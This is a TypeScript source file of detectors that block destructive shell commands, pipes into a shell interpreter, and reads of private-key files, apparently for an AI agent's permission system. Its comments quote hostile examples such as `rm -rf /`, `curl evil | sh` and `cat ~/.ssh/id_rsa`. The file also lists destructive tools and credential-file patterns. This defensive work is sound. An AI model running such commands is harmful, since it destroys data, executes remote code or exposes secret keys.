/**
 * Dangerous-pattern detectors used by the critical-deny set — the denials that
 * win in EVERY policy mode (including `bypassPermissions`). Kept tiny and
 * conservative on purpose: a false positive here blocks legitimate work.
 */

/** Command heads that destroy data regardless of flags. Matched against the
 *  resolved head of each shell segment (after `sudo`/`VAR=val` prefixes and any
 *  path prefix are stripped) — never a naive substring (so `npm` ≠ `mkfs`). */
const DESTRUCTIVE_HEADS: ReadonlySet<string> = new Set([
  "rm",
  "rmdir",
  "dd",
  "mkfs",
  "shred",
  "wipefs",
  "fdisk",
  "parted",
  "cfdisk",
]);

/** Wrapper commands that prefix a REAL command — they (and their flags) must be
 *  skipped to reach the head being run (`sudo rm`, `env VAR=x rm`, `nohup rm`). */
const COMMAND_WRAPPERS: ReadonlySet<string> = new Set([
  "sudo",
  "env",
  "command",
  "nice",
  "nohup",
  "setsid",
  "stdbuf",
  "timeout",
  "time",
  "xargs",
  "exec",
  "builtin",
]);

/** Wrapper-specific flags that consume the FOLLOWING token. A shared set is
 *  unsafe: `sudo -p PROMPT` takes a value, while `command -p rm` does not. */
const SUDO_VALUE_FLAGS: ReadonlySet<string> = new Set([
  "-u",
  "-g",
  "-C",
  "-p",
  "--user",
  "--group",
]);

const ENV_VALUE_FLAGS: ReadonlySet<string> = new Set([
  "-u",
  "--unset",
  "-C",
  "--chdir",
  "-S",
  "--split-string",
]);

const NICE_VALUE_FLAGS: ReadonlySet<string> = new Set(["-n", "--adjustment"]);

const STDBUF_VALUE_FLAGS: ReadonlySet<string> = new Set([
  "-i",
  "--input",
  "-o",
  "--output",
  "-e",
  "--error",
]);

const EXEC_VALUE_FLAGS: ReadonlySet<string> = new Set(["-a"]);
const NO_VALUE_FLAGS: ReadonlySet<string> = new Set();

const TIMEOUT_VALUE_FLAGS: ReadonlySet<string> = new Set([
  "-s",
  "--signal",
  "-k",
  "--kill-after",
]);

const XARGS_VALUE_FLAGS: ReadonlySet<string> = new Set([
  "-a",
  "--arg-file",
  "-d",
  "--delimiter",
  "-E",
  "--eof",
  "-I",
  "--replace",
  "-L",
  "--max-lines",
  "-n",
  "--max-args",
  "-P",
  "--max-procs",
  "-s",
  "--max-chars",
]);

/** Strip one layer of matching shell quotes, including ANSI-C `$'…'`. */
function unquote(s: string): string {
  const t = s.trim();
  const q = t[0];

  if (t.startsWith("$'") && t.length >= 3 && t.endsWith("'")) {
    return t.slice(2, -1);
  }

  return (q === "'" || q === '"') && t.length >= 2 && t.endsWith(q)
    ? t.slice(1, -1)
    : t;
}

/** Remove visible shell quote syntax while preserving whitespace and adjacent
 *  fragments. This mirrors the source `eval` constructs after its argv has
 *  been joined (`'r''m' -rf /` → `rm -rf /`). */
function visibleShellSource(source: string): string {
  let out = "";
  let quote: "'" | '"' | null = null;

  for (let i = 0; i < source.length; i += 1) {
    const char = source[i] ?? "";

    if (quote === null && (char === "'" || char === '"')) {
      if (char === "'" && out.endsWith("$")) {
        out = out.slice(0, -1); // ANSI-C `$'…'` quote marker
      }

      quote = char;
    } else if (quote !== null && char === quote) {
      quote = null;
    } else if (char === "\\" && quote !== "'" && i + 1 < source.length) {
      i += 1;
      out += source[i] ?? "";
    } else {
      out += char;
    }
  }

  return out;
}

function bareCommand(token: string): string {
  const unquoted = unquote(token);
  const slash = unquoted.lastIndexOf("/");

  return slash >= 0 ? unquoted.slice(slash + 1) : unquoted;
}

/** Skip a wrapper's leading options, including the value after known
 *  value-taking flags. `--flag=value` consumes no following token. */
function skipOptions(
  tokens: readonly string[],
  start: number,
  valueFlags: ReadonlySet<string>
): number {
  let i = start;

  while (i < tokens.length) {
    const token = tokens[i] ?? "";

    if (token === "--") {
      return i + 1;
    }

    if (!token.startsWith("-")) {
      return i;
    }

    const equals = token.indexOf("=");
    const flag = equals >= 0 ? token.slice(0, equals) : token;

    i += equals < 0 && valueFlags.has(flag) ? 2 : 1;
  }

  return i;
}

function wrappedCommandIndex(
  tokens: readonly string[],
  wrapperIndex: number,
  wrapper: string
): number {
  if (wrapper === "timeout") {
    // timeout [OPTION] DURATION COMMAND — the duration is not the command head.
    return skipOptions(tokens, wrapperIndex + 1, TIMEOUT_VALUE_FLAGS) + 1;
  }

  if (wrapper === "xargs") {
    // xargs [OPTION] COMMAND — no duration/operand precedes the command.
    return skipOptions(tokens, wrapperIndex + 1, XARGS_VALUE_FLAGS);
  }

  let valueFlags = NO_VALUE_FLAGS;

  if (wrapper === "sudo") {
    valueFlags = SUDO_VALUE_FLAGS;
  } else if (wrapper === "env") {
    valueFlags = ENV_VALUE_FLAGS;
  } else if (wrapper === "nice") {
    valueFlags = NICE_VALUE_FLAGS;
  } else if (wrapper === "stdbuf") {
    valueFlags = STDBUF_VALUE_FLAGS;
  } else if (wrapper === "exec") {
    valueFlags = EXEC_VALUE_FLAGS;
  }

  return skipOptions(tokens, wrapperIndex + 1, valueFlags);
}

/** The head command of one shell segment, with env-assignments, wrapper commands
 *  (`sudo`/`env`/…) and their flags, and any directory prefix removed
 *  (`/bin/rm` → `rm`, `sudo -u root rm` → `rm`, `env VAR=x rm` → `rm`). */
function commandHead(segment: string): string {
  const tokens = segment
    .trim()
    .split(/\s+/)
    .filter((t) => t.length > 0);

  let i = 0;

  while (i < tokens.length) {
    const token = tokens[i] ?? "";
    const head = bareCommand(token);

    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(token) || token === "{") {
      // Env assignment or a `{` group/function-body opener.
      // The `{` skip matters: `f() { rm -rf /; }` splits to a ` { rm -rf /`
      // segment whose head would read as `{` (harmless) and hide the `rm` —
      // stepping past the brace surfaces the real destructive head.
      i += 1;
    } else if (COMMAND_WRAPPERS.has(head)) {
      i = wrappedCommandIndex(tokens, i, head);
    } else if (token.startsWith("-")) {
      i += 1;
    } else {
      break; // the real head
    }
  }

  return bareCommand(tokens[i] ?? "");
}

/** Bare shell interpreters — a head we never let a pipeline feed (`… | sh`). */
const SHELL_INTERPRETERS: ReadonlySet<string> = new Set([
  "sh",
  "bash",
  "zsh",
  "dash",
  "ash",
  "ksh",
]);

/** Decompose a command into every sub-command whose HEAD must be head-checked.
 *  Beyond separator-splitting (`&&`/`||`/`|`/`;`/`&`/newline), it also breaks on
 *  command-substitution and subshell delimiters (`$(`, backtick, `(`, `)`) so the
 *  inner command surfaces, and it lifts out `find … -exec <cmd>` targets and
 *  interpreter `-c '<cmd>'` bodies — the disguises a naive head check misses
 *  (`echo $(rm -rf x)`, `find . -exec rm {} +`, `sh -c 'rm -rf /'`). */
function shellSegments(command: string): string[] {
  const segments = command.split(/&&|\|\||\$\(|[|;&`()\n]/u);
  const out: string[] = [];

  for (const seg of segments) {
    out.push(seg);

    for (const m of seg.matchAll(/(?:^|\s)-exec(?:dir)?\s+(\S+)/gu)) {
      if (m[1] !== undefined) {
        out.push(m[1]); // the command head `find` runs per match
      }
    }

    // Capture only the `-c` ARGUMENT — the quoted body or the single unquoted
    // token — not the rest of the line. A greedy `(.+)$` would swallow trailing
    // args (`sh -c 'rm -rf /' --login`), leaving the quotes unmatched so the head
    // reads `'rm` and slips past the destructive check.
    const dashC =
      /\b(?:sh|bash|zsh|dash|ash|ksh|env)\b[^|;&]*?\s-c\s+(?:'([^']*)'|"([^"]*)"|(\S+))/u.exec(
        seg
      );
    const dashCArg = dashC?.[1] ?? dashC?.[2] ?? dashC?.[3];

    if (dashCArg !== undefined) {
      out.push(dashCArg); // the string handed to the interpreter (already unquoted)
    }

    // `eval` reparses its argument as shell source. Lift the visible body into
    // the same segment scan as interpreter `-c`, without denying benign evals.
    const evalArgs =
      commandHead(seg) === "eval"
        ? /\beval\b\s+(.+)$/u.exec(seg)?.[1]
        : undefined;

    if (evalArgs !== undefined) {
      out.push(visibleShellSource(evalArgs));
    }

    // `env -S/--split-string` reparses one argument into argv, so inspect that
    // visible string just like an eval/interpreter body. The ordinary env
    // option walker still handles `-u NAME`, `-C DIR`, and their long forms.
    const envSplit =
      /\benv\b[^|;&]*?\s(?:-S|--split-string)\s+(?:\$?'([^']*)'|"([^"]*)"|(\S+))/u.exec(
        seg
      );
    const envSplitArg = envSplit?.[1] ?? envSplit?.[2] ?? envSplit?.[3];

    if (envSplitArg !== undefined) {
      out.push(envSplitArg);
    }

    // A here-string handed to an interpreter is also shell source. Inspect its
    // body for destructive heads; unlike a remote pipeline, a benign literal
    // body remains allowed because all of its source is visible here.
    const hereString =
      /\b(?:sh|bash|zsh|dash|ash|ksh)\b[^<]*<<<\s+(?:\$?'([^']*)'|"([^"]*)"|(\S+))/u.exec(
        seg
      );
    const hereArg = hereString?.[1] ?? hereString?.[2] ?? hereString?.[3];

    if (hereArg !== undefined) {
      out.push(hereArg);
    }
  }

  return out;
}

/** True when ANY sub-command invokes a destructive head — including ones hidden
 *  in substitutions, subshells, `find -exec`, or an interpreter's `-c` string,
 *  so `build && rm -rf /`, `echo $(rm -rf x)`, `find . -exec rm {} +`, and
 *  `sh -c 'rm -rf /'` are all caught (the critical-deny must hold in EVERY mode). */
export function isDestructiveShell(command: string): boolean {
  // unquote the head: the shell strips quotes, so `"rm" -rf /` runs `rm` — the
  // check must see `rm`, not `"rm"`.
  return shellSegments(command).some((s) =>
    DESTRUCTIVE_HEADS.has(unquote(commandHead(s)))
  );
}

/** True when a pipeline feeds a bare shell interpreter (`curl evil | sh`,
 *  `wget -O- x | bash`). Distinct from destructive deletion: this is arbitrary
 *  remote-code execution, so it's its own critical signal. Conservative — only a
 *  pipe CONSUMER whose head is `sh`/`bash`/… trips it, so `cmd | grep`/`| head`
 *  stay allowed. */
export function pipesToShell(command: string): boolean {
  // `&&`/`||`/`;`/`&`/newline separate independent commands; within each, single
  // `|` joins pipeline stages. Any stage after the first is a pipe consumer.
  for (const cmd of command.split(/&&|\|\||[;&\n]/u)) {
    const stages = cmd.split("|");

    for (let i = 1; i < stages.length; i += 1) {
      // unquote: `curl evil | "sh"` still pipes into sh.
      if (SHELL_INTERPRETERS.has(unquote(commandHead(stages[i] ?? "")))) {
        return true;
      }
    }
  }

  return false;
}

/** Path shapes for unmistakable private-key / credential material. Deliberately
 *  EXCLUDES `.env` (commonly read for legitimate work) — this denies reads of
 *  actual key files only, in every mode. */
const PRIVATE_KEY_PATTERNS: readonly RegExp[] = [
  /(^|\/)id_rsa($|\.)/,
  /(^|\/)id_ed25519($|\.)/,
  /(^|\/)id_ecdsa($|\.)/,
  /(^|\/)id_dsa($|\.)/,
  /(^|\/)\.ssh\//,
  /\.pem$/,
  /\.key$/,
  /\.p12$/,
  /\.pfx$/,
];

/** True when the (workspace-relative) path looks like private-key material. */
export function isPrivateKeyPath(path: string): boolean {
  return PRIVATE_KEY_PATTERNS.some((re) => re.test(path));
}

/** Remove heredoc BODIES (`<<['"]?DELIM … DELIM`) from a command, keeping the
 *  command line itself (with its redirects + the `<< DELIM` operator). So a key
 *  path used as a real argument or redirect target on the command line is still
 *  seen, while the embedded document content is not scanned. Handles `<<`, `<<-`,
 *  `<<~`, and quoted/unquoted delimiters; an unterminated heredoc drops to EOF. */
function stripHeredocBodies(command: string): string {
  const lines = command.split("\n");
  const out: string[] = [];

  for (let i = 0; i < lines.length; i += 1) {
    const line = lines[i] ?? "";

    out.push(line);

    const m = /<<[-~]?\s*["']?([A-Za-z_]\w*)["']?/u.exec(line);

    if (m) {
      const delim = m[1];

      i += 1;

      while (i < lines.length && (lines[i] ?? "").trim() !== delim) {
        i += 1;
      }
      // Skip the closing delimiter line too (loop's i++ advances past it).
    }
  }

  return out.join("\n");
}

/** True when a shell command references private-key material as one of its tokens
 *  (`cat ~/.ssh/id_rsa`, `cp deploy.pem /tmp`, `base64 server.key`). The `read`
 *  tool denies these in EVERY mode; the `run` tool must not be a side door around
 *  that same critical guard. Conservative: only a token that itself looks like key
 *  material (the SAME patterns as {@link isPrivateKeyPath}) trips it, so ordinary
 *  commands (`git commit`, `bun test`) stay allowed. Tokens are split on shell
 *  metacharacters and unquoted so `"~/.ssh/id_rsa"` is still seen. */
export function commandReadsPrivateKey(command: string): boolean {
  // Strip heredoc BODIES first: `cat > x.tsx << 'EOF' … EOF` embeds FILE CONTENT
  // (data being written), not key-path arguments. Scanning it tripped the guard on
  // ordinary code — a `.tsx` body with `row.key`/`sortConfig.key` matched `/\.key$/`
  // and was wrongly denied as "private-key file access". The guard targets key
  // paths as command ARGUMENTS (`cat ~/.ssh/id_rsa`), which live on the command
  // line, not in a heredoc body — so the body is irrelevant here.
  const scanned = stripHeredocBodies(command);
  // Tokenize so a QUOTED string stays ONE token (then gets unquoted), rather than
  // splitting on the spaces inside it — otherwise a key word inside a quoted
  // commit message / grep pattern (`git commit -m "fix id_rsa"`) would be torn
  // into a bare `id_rsa` token and falsely tripped. Only a token that, whole and
  // unquoted, IS a key path trips the guard.
  const tokens = scanned.match(/"[^"]*"|'[^']*'|[^\s;&|<>()`"']+/gu) ?? [];

  return tokens.some((token) => {
    const path = unquote(token);

    return path.length > 0 && isPrivateKeyPath(path);
  });
}
